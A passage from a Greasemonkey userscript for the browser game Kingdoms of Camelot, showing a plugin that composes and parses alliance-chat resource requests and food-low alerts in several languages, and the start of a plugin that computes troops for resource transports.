	var foodLowTokens     = SR.getArray("ksx_ResourceRequest_FoodLowTokens"    ,lang);
	
	var atResourceRequestClick = function () {
		if(ksxDebug) GM_log("ResourceRequestPlugin.atResourceRequestClick");
		//var ksx = unsafeWindow.ksx; if (ksx == null) throw "ksx is null!";

		var rrDestination = ksx.tools.getElement("rrDestination");
		var rrGoldAmount  = ksx.tools.getElement("rrGoldAmount");
		var rrFoodAmount  = ksx.tools.getElement("rrFoodAmount");
		var rrWoodAmount  = ksx.tools.getElement("rrWoodAmount");
		var rrStoneAmount = ksx.tools.getElement("rrStoneAmount");
		var rrOreAmount   = ksx.tools.getElement("rrOreAmount");

		var req = ksx.plugins.ResourceRequest.CurrentRequest;

		req.Version = "2";
		req.Destination = rrDestination.value.toLowerCase().replace(/;|-|\//, ",").replace("-", ",").replace("/", ",").replace(/\s+/g, "");
		//TODO KSX multilang
		req.Gold = rrGoldAmount.value.toLowerCase().replace(" ", "").replace("mille", "M").replace("kk", "M").replace("mio", "M").replace("mrd", "G");
		req.Food = rrFoodAmount.value.toLowerCase().replace(" ", "").replace("mille", "M").replace("kk", "M").replace("mio", "M").replace("mrd", "G");
		req.Wood = rrWoodAmount.value.toLowerCase().replace(" ", "").replace("mille", "M").replace("kk", "M").replace("mio", "M").replace("mrd", "G");
		req.Stone = rrStoneAmount.value.toLowerCase().replace(" ", "").replace("mille", "M").replace("kk", "M").replace("mio", "M").replace("mrd", "G");
		req.Ore = rrOreAmount.value.toLowerCase().replace(" ", "").replace("mille", "M").replace("kk", "M").replace("mio", "M").replace("mrd", "G");

		var pers = ksx.JSON.stringify(req);
		//ksx.logit("save: "+pers);
		GM_setValue("ResourceRequest_" + ksx.koc.getServerId(), pers);

		var modCommInput = ksx.tools.getElement("mod_comm_input");
		if (modCommInput == null) { alert("mod_comm_input not found!"); return; }

		// compose ResourceRequest in current language
		var sA = "";
		if (req.Gold .length > 0 && req.Gold  != 0) sA = sA + (sA.length > 0 ? " + " : "") + culang.gold  + " " + req.Gold;
		if (req.Food .length > 0 && req.Food  != 0) sA = sA + (sA.length > 0 ? " + " : "") + culang.food  + " " + req.Food;
		if (req.Wood .length > 0 && req.Wood  != 0) sA = sA + (sA.length > 0 ? " + " : "") + culang.wood  + " " + req.Wood;
		if (req.Stone.length > 0 && req.Stone != 0) sA = sA + (sA.length > 0 ? " + " : "") + culang.stone + " " + req.Stone;
		if (req.Ore  .length > 0 && req.Ore   != 0) sA = sA + (sA.length > 0 ? " + " : "") + culang.ore   + " " + req.Ore;
		//if(sA.length==0) return;
		var s = "/a " + requestTokens[0] + " " + req.Destination + " " + sA;
		//ksx.logit("Send: "+s);
		
		ksx.tools.type(modCommInput, s);
		ksx.tools.click(modCommInput.nextSibling);

		ksx.tools.getElement("rrContainer").style.display = "none";
		ksx.tools.getElement("//*[@class='comm_body comm_global']").style.display = "";
	};
	this.atResourceRequestClick = atResourceRequestClick;

	this.CurrentRequest = {
		Version: "2",
		Destination: "xxx,yyy",
		Gold: "",
		Food: "",
		Wood: "",
		Stone: "",
		Ore: "100mio"
	};

	var atShowResourceRequest = function () {
		/*DEBUGCODE:*/if(ksxDebug) GM_log("ResourceRequestPlugin.atShowResourceRequest");
		ksx.tools.getElement("rrContainer").style.display = "";
		ksx.tools.getElement("//*[@class='comm_body comm_global']").style.display = "";
	};
	this.atShowResourceRequest = atShowResourceRequest;

	var atCloseResourceRequest = function () {
		/*DEBUGCODE:*/if(ksxDebug) GM_log("ResourceRequestPlugin.atCloseResourceRequest");
		ksx.tools.getElement("rrContainer").style.display = "none";
		ksx.tools.getElement("//*[@class='comm_body comm_global']").style.display = "";
	};
	this.atCloseResourceRequest = atCloseResourceRequest;

	this.initUI = function () {
		/*DEBUGCODE:*//*if (ksxDebug)*/GM_log("ResourceRequestPlugin.initUI");

		var kocCommTabs = ksx.tools.getElement("comm_tabs");
		if (!kocCommTabs) { throw "Element 'comm_tabs' not found! Maybe KoC has some changes."; }
		var modComm = ksx.tools.getElement("//*[@class='mod_comm']");
		if (!modComm) { throw "Element 'mod_comm' not found! Maybe KoC has some changes."; }

		// Append the "Anfrage" Tab resourceRequestButtonTitle
		var btn = ksx.Builder.ComTabButton(culang.ksx_KoCButtler_ResourceRequest_ButtonTitle, "ksx.plugins.ResourceRequest.atShowResourceRequest();return false;");
		kocCommTabs.appendChild(btn);

		// Append the "Resource-Request" form
		var htmlTemplate ="";
		if (Options.pbChatOnRight==true) {
			htmlTemplate = "<div id='rrContainer' style='padding: 5px; text-align: center; -moz-border-radius:3px; border:1px inset #FFF; -moz-box-shadow: 0 0 3px 3px #141516;  background-image:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif); position: relative; top:-80px; height: 270px; margin-left: 50px; overflow-x: hidden; overflow-y: hidden;  width: 220px;'><table class=pdxTab style='background-image:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif); color=#FFFFFF; width: 100%'><tr><td><span style='font-weight: bold; color: #FFFFFF;'>{%Caption%}</span></td><td style='text-align: right'><a href='#' onclick='ksx.plugins.ResourceRequest.atCloseResourceRequest();return false;'><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/close_icon.png' alt='X' /></a></td></tr></table><table style='color:#FFF;' class=pdxTab><tbody><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png'></td><td>{%Amount%}:<input id='rrFoodAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png'></td><td>{%Amount%}:<input id='rrWoodAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png'></td><td>{%Amount%}:<input id='rrStoneAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png'></td><td>{%Amount%}:<input id='rrOreAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png'></td><td>{%Amount%}:<input id='rrGoldAmount' type='text' value='0' maxlength='11' size='11'></td></tr></tbody></table><div style='margin-bottom: 10px; display: none'><span id='rrCityTo'><input id='rrTraderTo_0' class='castleBut castleButNon' type='submit' value='1'><input id='rrTraderTo_1' class='castleBut castleButNon' type='submit' value='2'><input id='rrTraderTo_2' class='castleBut castleButNon' type='submit' value='3'><input id='rrTraderTo_3' class='castleBut castleButNon' type='submit' value='4'><input id='rrTraderTo_4' class='castleBut castleButNon' type='submit' value='5'><input id='rrTraderTo_5' class='castleBut castleButNon' type='submit' value='6'><input id='rrTraderTo_6' class='castleBut castleButNon' type='submit' value='7'><span id='rrTraderToCityName' style='display: inline-block; width: 85px; font-weight: bold;'></span></span></div><div style='color:#FFF;'>{%Destination%} (X,Y):<input id='rrDestination' type='text' maxlength='7' size='7'></div><br/><span><a class='button20' onclick='ksx.plugins.ResourceRequest.atResourceRequestClick();return false;'><span>{%SendRequest%}</span></a></span></div>";
		} else if (Options.pbChatOnRight==false) {
			htmlTemplate = "<div id='rrContainer' style='padding: 5px; text-align: center; -moz-border-radius:3px; border:1px inset #FFF; -moz-box-shadow: 0 0 3px 3px #141516;  background-image:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif); position: relative; top:-310px; height: 270px; margin-left: 355px; overflow-x: hidden; overflow-y: hidden;  width: 220px; z-index:2000000;'><table class=pdxTab style='background-image:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif); color=#FFFFFF; width: 100%'><tr><td><span style='font-weight: bold; color: #FFFFFF;'>{%Caption%}</span></td><td style='text-align: right'><a href='#' onclick='ksx.plugins.ResourceRequest.atCloseResourceRequest();return false;'><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/close_icon.png' alt='X' /></a></td></tr></table><table style='color:#FFF;' class=pdxTab><tbody><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png'></td><td>{%Amount%}:<input id='rrFoodAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png'></td><td>{%Amount%}:<input id='rrWoodAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png'></td><td>{%Amount%}:<input id='rrStoneAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png'></td><td>{%Amount%}:<input id='rrOreAmount' type='text' value='0' maxlength='11' size='11'></td></tr><tr align='center'><td><img src='http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png'></td><td>{%Amount%}:<input id='rrGoldAmount' type='text' value='0' maxlength='11' size='11'></td></tr></tbody></table><div style='margin-bottom: 10px; display: none'><span id='rrCityTo'><input id='rrTraderTo_0' class='castleBut castleButNon' type='submit' value='1'><input id='rrTraderTo_1' class='castleBut castleButNon' type='submit' value='2'><input id='rrTraderTo_2' class='castleBut castleButNon' type='submit' value='3'><input id='rrTraderTo_3' class='castleBut castleButNon' type='submit' value='4'><input id='rrTraderTo_4' class='castleBut castleButNon' type='submit' value='5'><input id='rrTraderTo_5' class='castleBut castleButNon' type='submit' value='6'><input id='rrTraderTo_6' class='castleBut castleButNon' type='submit' value='7'><span id='rrTraderToCityName' style='display: inline-block; width: 85px; font-weight: bold;'></span></span></div><div style='color:#FFF;'>{%Destination%} (X,Y):<input id='rrDestination' type='text' maxlength='7' size='7'></div><br/><span><a class='button20' onclick='ksx.plugins.ResourceRequest.atResourceRequestClick();return false;'><span>{%SendRequest%}</span></a></span></div>";
		}
		htmlTemplate=htmlTemplate.replace(/{%Caption%}/g,culang.ksx_KoCButtler_ResourceRequest_UICaption);
		htmlTemplate=htmlTemplate.replace(/{%Destination%}/g,culang.ksx_KoCButtler_ResourceRequest_UIDestination);
		htmlTemplate=htmlTemplate.replace(/{%Amount%}/g,culang.ksx_KoCButtler_ResourceRequest_UIAmount);
		htmlTemplate=htmlTemplate.replace(/{%SendRequest%}/g,culang.ksx_KoCButtler_ResourceRequest_UISendRequest);
		var div = ksx.Builder.Element("div", htmlTemplate);
		div.setAttribute("id", "rrContainer"); //WORKARROUND id from template is not pressent!?
		div.style.display = "none"; // hide on init
		modComm.appendChild(div);

		var s = GM_getValue("ResourceRequest_" + ksx.koc.getServerId());
		// GM_log("Load ResourceRequest:" + s);

		var rrDestination = ksx.tools.getElement("rrDestination");
		var rrGoldAmount = ksx.tools.getElement("rrGoldAmount");
		var rrFoodAmount = ksx.tools.getElement("rrFoodAmount");
		var rrWoodAmount = ksx.tools.getElement("rrWoodAmount");
		var rrStoneAmount = ksx.tools.getElement("rrStoneAmount");
		var rrOreAmount = ksx.tools.getElement("rrOreAmount");

		if (s != null) {
			var rr = ksx.JSON.parse(s);
			if (ksxDebug) GM_log("Output: " + typeof (rr.ksxVersion));
			if (typeof (rr.ksxVersion) != "string" || rr.ksxVersion != "2") {
				rrDestination.value = "xxx,yyy";
				rrGoldAmount.value = "";
				rrFoodAmount.value = "";
				rrWoodAmount.value = "";
				rrStoneAmount.value = "";
				rrOreAmount.value = "100mio";
			} else {
				rrDestination.value = rr.Destination;
				rrGoldAmount.value = rr.Gold;
				rrFoodAmount.value = rr.Food;
				rrWoodAmount.value = rr.Wood;
				rrStoneAmount.value = rr.Stone;
				rrOreAmount.value = rr.Ore;
			}
		} else {
			rrDestination.value = "xxx,yyy";
			rrGoldAmount.value = "";
			rrFoodAmount.value = "";
			rrWoodAmount.value = "";
			rrStoneAmount.value = "";
			rrOreAmount.value = "100mio";
		}
	};

	this.atRequestEntry = function(msg, filter) { // requestTokens && !isOwnEntry
		/*DEBUGCODE:*/if (ksxDebug) GM_log("REQUEST token found");
		
		var tReqR = msg.msgtxt;
		var t1R = tReqR.indexOf(msg.token);
		tReqR = tReqR.substring(t1R, tReqR.length);
		var t2R = tReqR.indexOf("'");
		if (t2R >= 0) tReqR = tReqR.substr(0, t2R);

		var tAck = tReqR.replace(msg.token, acknowledgeTokens[0]);
		var cA = "var chat = document.getElementById('mod_comm_input'); chat.value = '" + tAck + "';chat.focus(); return false;";

		var actiondiv = document.createElement('div');
		actiondiv.setAttribute("style", "padding: 0 0 0 30px;");
		actiondiv.appendChild(ksx.Builder.GreenButton(culang.ksx_KoCButtler_ResourceRequest_AckButtonTitle, cA));
		msg.msgdiv.appendChild(actiondiv);
		
		reqStyle = 'width: '+ (Options.chatWidth-70) +'px;';
		if (Options.pdxBackgroundStyle=="pdxKoCOld" /* && Options.pbChatOnRight==true*/ ) {
			var reqStyle = "background: " + ksx.configuration.chat.backgrounds.RequestItemBackground;
		} else {
			var reqStyle = "color:#333333 !important; background-color: lightgreen; -moz-box-shadow: 0 0 3px 2px lightgreen; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
		}
		msg.msgdiv.setAttribute("style", reqStyle);
		return true;
	};
	
	this.atOwnAcknowledgeEntry = function (msg, filter) {
		/*DEBUGCODE:*/if (ksxDebug) GM_log("ACKNOWLEDGE token found");
		
		var tAckM = msg.msgtxt;
		var t1A = tAckM.indexOf(msg.token);
		tAckM = tAckM.substring(t1A, tAckM.length);
		var t2A = tAckM.indexOf("'");
		if (t2A >= 0) tAckM = tAckM.substr(0, t2A);

		var goldAmount = 0;
		var foodAmount = 0;
		var woodAmount = 0;
		var stoneAmount = 0;
		var oreAmount = 0;
		var x; var y;

		var xyPattern = /([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})/;
		var match = xyPattern.exec(msg.msgtxt);
		if (match === null) return false;
		x = match[1]; y = match[3];

		//TODO KSX multilang
		var pattern = /(Nahrung|Futter|Food|Erz|Ore|Holz|Wood|Steine|Stein|Stone|Gold)\s*([0-9]+)(mio|mrd|bio|M|G|T|kkkk|kkk|kk|k)/gi;
		while (match = pattern.exec(msg.msgtxt)) {
			var res = match[1];
			var amount = match[2];
			var unit = match[3];
			var amountB;
			switch (unit.toLowerCase()) {
				case "k": amountB = amount * 1000; break;
				case "m": case "mio": case "kk": amountB = amount * 1000000; break;
				case "g": case "mrd": case "kkk": amountB = amount * 1000000000; break;
				case "t": case "bio": case "kkkk": amountB = amount * 1000000000000; break;
				default: amountB = amount * 1;
			}

			switch (res.toLowerCase()) {
				case "gold": goldAmount = amountB; break;
				case "nahrung": case "futter": case "food": foodAmount = amountB; break;
				case "holz": case "wood": woodAmount = amountB; break;
				case "steine": case "stein": case "stone": stoneAmount = amountB; break;
				case "erz": case "ore": oreAmount = amountB; break;
				default: break;
			}
		}

		var tDly = tAckM.replace(msg.token, deliveryTokens[0]);
		var cD = " \
				ksx.plugins.MarchExtender.march.show(1, " + x + ", " + y + ", [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [" + goldAmount + ", " + foodAmount + ", " + woodAmount + ", " + stoneAmount + ", " + oreAmount + "]); \
				ksx.plugins.MarchExtender.march.transportTools.calculateFastestTroopsForTransport(); \
				var chat = document.getElementById('mod_comm_input'); \
				chat.value = '" + tDly + " / ??min';chat.focus(); \
				return false;";

		var ackStyle ='';
		if (Options.pdxBackgroundStyle=="pdxKoCOld" /* && Options.pbChatOnRight==true*/ ) {
			ackStyle = "background: " + ksx.configuration.chat.backgrounds.RequestItemBackground;
		} else {
			ackStyle = "color:#141516 !important; background-color: green; -moz-box-shadow: 0 0 3px 2px green; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
		}
		var actiondiv = document.createElement('div');
		actiondiv.setAttribute("style", "padding: 0 0 0 30px;");
		actiondiv.appendChild(ksx.Builder.GreenButton(culang.ksx_KoCButtler_ResourceRequest_DlyButtonTitle, cD));
		msg.msgdiv.appendChild(actiondiv);
		msg.msgdiv.setAttribute("style", ackStyle);

		return true;
	};
	this.atFootLowEntry = function (msg, filter) {
		/*DEBUGCODE:*/ GM_log("FoodLow token found");
		//DE: Mein Heiligtum TEST (777,888) hat zu wenig Nahrung sie reicht noch f?r 1,234,567 (1h 33m) - Verbrauch: -666,777
		//EN: My city Amsterdam (290,506) is low on food. Remaining: 7,629 (2h 16m) Upkeep: -3,348*/

		var allyFoodLowStyle='';
		if (Options.pdxBackgroundStyle=="pdxKoCOld" /* && Options.pbChatOnRight==true*/ ) {
			allyFoodLowStyle = "background: " + ksx.configuration.chat.backgrounds.RequestItemBackground;
		}else{
			allyFoodLowStyle = "color:#FFF !important; background-color: darkblue; -moz-box-shadow: 0 0 3px 2px darkblue; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
		}
		var pattern = [];
		pattern['en'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\(([0-9\shms ]+)\).*Usage:\s([0-9,-]+)/img;
		//Mein Heiligtum kBraku (599,601) hat zu wenig Nahrung sie reicht noch f?r 106,168,260 (15Std. 47m ) - Verbrauch: -6,724,332
		pattern['de'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\(([0-9\Stdmsec. ]+)\).*Verbrauch:\s([0-9,-]+)/img;
		//Mon Sanctuaire kBraku (599,601) manque de nourriture 131,484,906 (19h 31m ) - Utilisation: -6,735,717
		pattern['fr'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\(([0-9\shms ]+)\).*Utilisation:\s([0-9,-]+)/img;
		//Mi Santuario kBraku (599,601) tiene poco alimento 151,976,874 (22h 35m ) - Uso: -6,728,614
		pattern['es'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\(([0-9\shms ]+)\).*Uso:\s([0-9,-]+)/img;
		//Il mio santuario kBraku (599,601) ha poco cibo, basta ancora per 31,087,035 (4h 37m ) - Consumo: -6,721,511
		pattern['it'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\(([0-9\shms ]+)\).*Consumo:\s([0-9,-]+)/img;
		//Benim Sehirim kBraku (599,601) in yiyecegi bitmesine kalan s?re 31,647,318 (4saat 42dakika ) - Gider: -6,721,511
		pattern['tr'] = /.*\(([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})\).*\s([0-9,]+)\s\((.+)\).*Gider:\s([0-9,-]+)/img;
		
		var match = pattern['en'].exec(msg.msgtxt);
		if (match === null) match = pattern['de'].exec(msg.msgtxt);
		if (match === null) match = pattern['fr'].exec(msg.msgtxt);
		if (match === null) match = pattern['es'].exec(msg.msgtxt);
		if (match === null) match = pattern['it'].exec(msg.msgtxt);
		if (match === null) match = pattern['tr'].exec(msg.msgtxt);
		if (match === null) {
			//Uuups
			GM_log("atFootLowEntry not match!? filter: "+filter.name);
			return true;
		}

		var x = match[1];
		var y = match[3];
		var foodleft = match[4].replace(",", "").replace(",", "").replace(",", "").replace(",", "").replace(",", "");
		var timeleft = match[5];
		var foodconsumption = match[6].replace(",", "").replace(",", "").replace(",", "").replace(",", "").replace(",", "");

		var foodAmount = -1 * foodconsumption * 8;

		if (ksxDebug) GM_log("FoodLow (Alli): " + x + "," + y + " " + foodleft + " " + timeleft + " " + foodconsumption + "/h -> " + foodAmount);

		// Best?tigung
		var tAck = acknowledgeTokens[0] + " " + x + "," + y + " " + culang.food + " " + foodAmount;
		var cA = "var chat = document.getElementById('mod_comm_input'); chat.value = '" + tAck + "';chat.focus(); return false;";

		// Lieferung
		var tDly = deliveryTokens[0] + " " + x + "," + y + " " + culang.food + " " + foodAmount + " /??min";
		var cDt = "\
				ksx.plugins.MarchExtender.march.show(1, " + x + ", " + y + ", [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, " + foodAmount + ", 0, 0, 0]); \
				ksx.plugins.MarchExtender.march.transportTools.calculateFastestTroopsForTransport(); \
				var chat = document.getElementById('mod_comm_input'); chat.value = '" + tDly + "'; \
				return false;";

		var actiondiv = document.createElement('div');
		actiondiv.setAttribute("style", "padding: 0 0 0 30px;");
		actiondiv.appendChild(ksx.Builder.GreenButton(culang.ksx_KoCButtler_ResourceRequest_AckButtonTitle, cA));
		actiondiv.appendChild(ksx.Builder.GreenButton(culang.ksx_KoCButtler_ResourceRequest_ExpressDlyButtonTitle, cDt));
		msg.msgdiv.appendChild(actiondiv);
		msg.msgdiv.setAttribute("style", allyFoodLowStyle);
		return true;
	};
	this.scanChatItem = function (msg, filter) {
		/*DEBUGCODE:*/if (ksxDebug) GM_log("ResourceRequestPlugin.scanChatItem");

		var dlyStyle='';
		if (Options.pdxBackgroundStyle=="pdxKoCOld" /* && Options.pbChatOnRight==true*/ ) {
			dlyStyle = "background: " + ksx.configuration.chat.backgrounds.RequestItemBackground;
		} else {
			dlyStyle = "color:#333 !important; background-color: blue; -moz-box-shadow: 0 0 3px 2px blue; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
		}
		
		if (msg.token0 == acknowledgeTokens[0] && !msg.isOwnEntry) {
			/*DEBUGCODE:*/if (ksxDebug) GM_log("ACKNOWLEDGE (alliance) token found");
			msg.msgdiv.setAttribute("style", dlyStyle);
			return true;
		} else if (msg.token0 == deliveryTokens[0] && !msg.isOwnEntry) {
			/*DEBUGCODE:*/if (ksxDebug) GM_log("DELIVERY (alliance) token found");
			msg.msgdiv.setAttribute("style", dlyStyle);
			return true;
			
		} else if (msg.token0 == foodLowTokens[0] && msg.isOwnEntry) {
			/*DEBUGCODE:*/if (ksxDebug) GM_log("FoodLow (own) token found");
			//msg.msgdiv.setAttribute("style", ownFoodLowStyle);
			return true;
		} else if (msg.token0 == foodLowTokens[0] && !msg.isOwnEntry) {
			/*DEBUGCODE:*/if (ksxDebug) GM_log("FoodLow (Alliance) token found");
//			return this.atFootLowEntry(msg, filter);
		}
		return false;
	};



	this.initUI();
	var filters = ksx.plugins.ChatMonitor.filters;
	var Filter = ksx.plugins.ChatMonitor.Filter;
	filters.push(new Filter('REQUEST-Own', requestTokens, { isOwnEntry: true }, this.scanChatItem));
	filters.push(new Filter('REQUEST-Alli', requestTokens, { isOwnEntry: false }, this.atRequestEntry));
	filters.push(new Filter('ACKNOWLEDGE-Own', acknowledgeTokens, { isOwnEntry: true }, this.atOwnAcknowledgeEntry));
	filters.push(new Filter('ACKNOWLEDGE-Alli', acknowledgeTokens, { isOwnEntry: false }, this.scanChatItem));
	filters.push(new Filter('DELIVERY', deliveryTokens, {}, this.scanChatItem));
	//filters.push(new Filter('FoodLow-Own', foodLowTokens, { isOwnEntry: true }, this.scanChatItem)); 
	filters.push(new Filter('FoodLow-Own', foodLowTokens, { isOwnEntry: true }, this.atFootLowEntry));
	filters.push(new Filter('FoodLow-Alli', foodLowTokens, { isOwnEntry: false }, this.atFootLowEntry));
};

function MarchExtenderPlugin(ksx) {
// 2011-09-19 FIX NaN
// 2011-10-28 FIX troops not filled if any toop type was not available
// 2011-10-28 FIX troops not filled if march type was not 'repeat'

	var thisPlugin = this;

	this.march = {
		type: 0,
		ui: null,

		transportTools: {
			uiElement: null,
			uiElementId: "ksxTransportTools",

			hide: function () {
				if(ksxDebug) GM_log("MarchExtenderPlugin.march.transportTools.hide()");
				uiElement = ksx.tools.getElement("ksxTransportTools");
				if (!uiElement) return;
				uiElement.style.display = "none";
			},

			show: function (visible) {
				if (ksxDebug) GM_log("MarchExtenderPlugin.march.transportTools.show(" + Boolean(visible) + ")");
				var t = ksx.plugins.MarchExtender.march.transportTools;
				uiElement = document.getElementById(t.uiElementId);
				if (!uiElement) uiElement = t.create();
				t.uiElement.style.display = ((visible) ? "" : "none");
			},

			create: function (visible) {
				if (ksxDebug) GM_log("MarchExtenderPlugin.march.transportTools.create(" + Boolean(visible) + ")");
				var t = ksx.plugins.MarchExtender.march.transportTools;
				t.uiElement = document.getElementById(t.uiElementId);
				if (t.uiElement) return t.uiElement;
				
				//TODO KSX multilang
				if(typeof(culang.PredefinedTransports)=="undefined") culang.PredefinedTransports=(LangOptions.culang=="de") ? "Vordefinierte Transporte" : "Predefined Transports";
				if(typeof(culang.Training)=="undefined") culang.Training=(LangOptions.culang=="de") ? "Training" : "Training";
				if(typeof(culang.LastUsed)=="undefined") culang.LastUsed=(LangOptions.culang=="de") ? "Zuletzt verwendet" : "Last Used";
				if(typeof(culang.CalculateTroops)=="undefined") culang.CalculateTroops=(LangOptions.culang=="de") ? "Truppen Berechnen" : "Calculate Troops";
				var myString = " \
					<div class='section' > \
						<div class='section_title'>Transport Tools</div> \
						<div class='section_content' > \
							<a class='button20' href='#' onclick='ksx.plugins.MarchExtender.march.transportTools.calculateFastestTroopsForTransport();return false;'><span>{%CalculateTroops%}</span></a> \
							<a class='buttonGreen20' style='display:inline; position:absolute;margin-left:4px' href='#' onclick='ksx.plugins.MarchExtender.march.transportTools.calculateFastestTroopsForTransportHelp();return false;'><span>?</span></a> \
							<br/><br/> \
							<span> \
								{%PredefinedTransports%}:<br/>  \
								<select onchange='ksx.plugins.MarchExtender.march.transportTools.atTransportTemplateChanged(this);return false;' style='width: 307px'> \
										<option value=''><option> \
									<optgroup label='{%Training%} (4 {%cottages%}/{%stpop%} 18000, {%shrheavycavalry%},VP11,FP10)'> \
										<option value='0,1400000,2700000,0,180000'>{%supplytroop%} (18k)</option>	 \
										<option value='0,1940000,1800000,0,900000'>{%militiaman%} (18k)</option> \
										<option value='0,2660000,1800000,0,2700000'>{%scout%} (18k)</option> \
										<option value='0,3200000,9000000,0,1800000'>{%pikeman%} (18k)</option>	 \
										<option value='0,4100000,2700000,0,7200000'>{%swordsman%} (18k)</option> \
										<option value='0,2700000,3150000,0,2700000'>{%archer%} (9k)</option> \
										<option value='0,6500000,3600000,0,3000000'>{%cavalry%} (6k)</option>	 \
										<option value='0,6500000,1500000,0,7500000'>{%heavycavalry%} (3000)</option> \
										<option value='0,2700000,6750000,0,1575000'>{%supplywagon%} (4500)</option> \
										<option value='0,7250000,8100000,0,4860000'>{%ballista%} (2700)</option> \
										<option value='0,6500000,9000000,0,2250000'>{%batteringram%} (1500)</option> \
										<option value='0,5000000,5000000,8000000,1200000'>{%catapult%} (1000)</option> \
									</optgroup> \
									<optgroup label='{%Training%} ({%shrheavycavalry%} {%transport%})'> \
										<option value='0,4900000,5500000,0,2750000'>{%militiaman%} (55k, {%shrheavycavalry%},VP:9,FP:9)</option> \
										<option value='0,8500000,10000000,0,5000000'>{%militiaman%} (100k, {%shrheavycavalry%},VP:11,FP:10)</option> \
									</optgroup> \
									<optgroup label='{%LastUsed%}'> \
										<option value='0,1500000000,0,0,0'>{%food%} 1500mio</option>	 \
									</optgroup> \
								</select> \
									<a class='buttonGreen20' style='display:inline; position:absolute;margin-left:4px' href='#' onclick='ksx.plugins.MarchExtender.march.transportTools.transportTemplateHelp();return false;'><span>?</span></a> \
							</span> \
						</div> \
					</div> \
					";
				myString=culang.doTranslate(myString);
				var modalAttackTransport = ksx.tools.getElement("modal_attack_transport");
				t.uiElement = ksx.Builder.Element("div", myString);
				t.uiElement.setAttribute("id", t.uiElementId);
				t.uiElement.style.display = ((visible) ? "" : "none");
				modalAttackTransport.parentNode.appendChild(t.uiElement);
				return t.uiElement;
			},

			calculateFastestTroopsForTransport: function () {
				try {
					if (ksxDebug) GM_log("MarchExtenderPlugin.march.transportTools.calculateFastestTroopsForTransport");
					ui = new ksx.koc.MarchUI();

					var fp = unsafeWindow.seed.tech["tch10"]; // Level Federgewicht-Pulver
					var maxUnits = Number(ui.maxUnit.textContent);
					var wagonLoad = 5000;
					var hKavLoad = 80;
					var kavLoad = 100;
					var scoutLoad = 5;
					var m = 1 * ui.gold.value + 1 * ui.food.value + 1 * ui.wood.value + 1 * ui.stone.value + 1 * ui.ore.value;

					var cHKav = Math.ceil(m / (hKavLoad * (1 + fp / 10)));
					var cWagon = Math.ceil(m / (wagonLoad * (1 + fp / 10)));
					var cKav = Math.ceil(m / (kavLoad * (1 + fp / 10)));
					var cScout = Math.ceil(m / (scoutLoad * (1 + fp / 10)));
					if (ksxDebug) GM_log("Reset all units");
					for (var i = 1; i <= 12; i++) {
						if (!ui["unitIpt" + i]) GM_log("WARNING: calculateFastestTroopsForTransport - Element not specified - unitIpt" + i);
						ui["unitIpt" + i].value = 0; ksx.tools.typeKeys2(ui["unitIpt" + i], "0");
					}
					if (ksxDebug) GM_log("set best unit");
					if (cScout < Number(ui.unitnum3.textContent) && cScout < maxUnits) ksx.tools.typeKeys2(ui.unitIpt3, cScout);
					else if (cKav < Number(ui.unitnum7.textContent) && cKav < maxUnits) ksx.tools.typeKeys2(ui.unitIpt7, cKav);
					else if (cHKav < Number(ui.unitnum8.textContent) && cHKav < maxUnits) ksx.tools.typeKeys2(ui.unitIpt8, cHKav);
					else if (cWagon < Number(ui.unitnum9.textContent) && cWagon < maxUnits) ksx.tools.typeKeys2(ui.unitIpt9, cWagon);
				} catch (e) {
					GM_log("ERROR: MarchExtenderPlugin.calculateFastestTroopsForTransport - " + e);
					throw e;
				}
			},
			calculateFastestTroopsForTransportHelp: function () {
				ksx.Builder.showDialog("Truppen Berechnen", "Berechnet f?r die angegebenen Mengen, die schnellste Transportm?glichkeit.");
			},
			transportTemplateHelp: function () {
				ksx.Builder.showDialog("Vordefinierte Transporte", "Enth?lt ein Liste mit vordefinierte Transporten. Truppentrainingstransporte sind berechnet f?r 4 H?tten.");
			},

			atTransportTemplateChanged: function (sender) {
